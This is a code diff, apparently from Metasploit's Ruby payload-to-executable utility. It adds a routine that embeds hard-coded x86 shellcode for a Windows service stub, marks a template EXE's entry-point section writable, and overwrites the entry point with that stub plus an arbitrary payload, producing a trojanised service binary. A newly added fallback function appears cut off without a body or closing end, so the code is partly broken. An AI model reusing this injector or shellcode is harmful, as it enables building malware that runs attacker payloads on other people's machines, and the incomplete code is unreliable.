@@ -533,8 +533,81 @@ require 'digest/sha1'
       pe[136, 4] = [rand(0x100000000)].pack('V')
     end
 
-    return pe
+    #code_service could be encoded in the futur
+    code_service =
+    "\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
+    "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
+    "\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +
+    "\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01" +
+    "\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B" +
+    "\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4" +
+    "\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B" +
+    "\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" +
+    "\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" +
+    "\x6A\x00\x68\x70\x69\x33\x32\x68\x61\x64\x76\x61\x54\x68\x4C\x77" +
+    "\x26\x07\xFF\xD5\x68"+name[4,3]+"\x00\x68"+name[0,4]+"\x89\xE1" +
+    "\x8D\x85\xD0\x00\x00\x00\x6A\x00\x50\x51\x89\xE0\x6A\x00\x50\x68" +
+    "\xFA\xF7\x72\xCB\xFF\xD5\x6A\x00\x68\xF0\xB5\xA2\x56\xFF\xD5\x58" +
+    "\x58\x58\x58\x31\xC0\xC3\xFC\xE8\x00\x00\x00\x00\x5D\x81\xED\xD6" +
+    "\x00\x00\x00\x68"+name[4,3]+"\x00\x68"+name[0,4]+"\x89\xE1\x8D" +
+    "\x85\xC9\x00\x00\x00\x6A\x00\x50\x51\x68\x0B\xAA\x44\x52\xFF\xD5" +
+    "\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x04\x6A\x10" +
+    "\x89\xE1\x6A\x00\x51\x50\x68\xC6\x55\x37\x7D\xFF\xD5"
+
+
+    # Allow the user to specify their own EXE template
+    set_template_default(opts, "template_x86_windows.exe")
+
+    pe = Rex::PeParsey::Pe.new_from_file(opts[:template], true)
+
+    exe = ''
+    File.open(opts[:template], 'rb') { |fd|
+      exe = fd.read(fd.stat.size)
+    }
+
+    pe_header_size=0x18
+    section_size=0x28
+    characteristics_offset=0x24
+    virtualAddress_offset=0xc
+    sizeOfRawData_offset=0x10
+
+    sections_table_rva = pe._dos_header.v['e_lfanew']+pe._file_header.v['SizeOfOptionalHeader']+pe_header_size
+    sections_table_offset = pe.rva_to_file_offset(sections_table_rva)
+    sections_table_characteristics_offset = pe.rva_to_file_offset(sections_table_rva+characteristics_offset)
+
+    sections_header = []
+    pe._file_header.v['NumberOfSections'].times { |i|
+      sections_header << [sections_table_characteristics_offset+(i*section_size),exe[sections_table_offset+(i*section_size),section_size]]
+    }
+
+
+
+    #look for section with entry point
+    sections_header.each do |sec|
+      virtualAddress = sec[1][virtualAddress_offset,0x4].unpack('L')[0]
+      sizeOfRawData = sec[1][sizeOfRawData_offset,0x4].unpack('L')[0]
+      characteristics = sec[1][characteristics_offset,0x4].unpack('L')[0]
+      if pe.hdr.opt.AddressOfEntryPoint >= virtualAddress && pe.hdr.opt.AddressOfEntryPoint < virtualAddress+sizeOfRawData
+        #put this section writable
+        characteristics|=0x80000000
+        newcharacteristics = [characteristics].pack('L')
+        exe[sec[0],newcharacteristics.length]=newcharacteristics
+      end
+    end
+
+    #put the shellcode at the entry point, overwriting template
+    exe[pe.rva_to_file_offset(pe.hdr.opt.AddressOfEntryPoint),code_service.length+code.length]=code_service+code
+
+    return exe
+
   end
+
+  def self.to_win32pe_service_old(framework, code, opts={})
+
+    name = opts[:servicename]
+
+    # Allow the user to specify their own service EXE template
+    set_template_default(opts, "template_x86_windows_svc.exe")
 
   def self.to_win64pe_service(framework, code, opts={})
 
@@ -1793,4 +1866,3 @@ def self.to_vba(framework,code,opts={})
 end
 end
 end
-
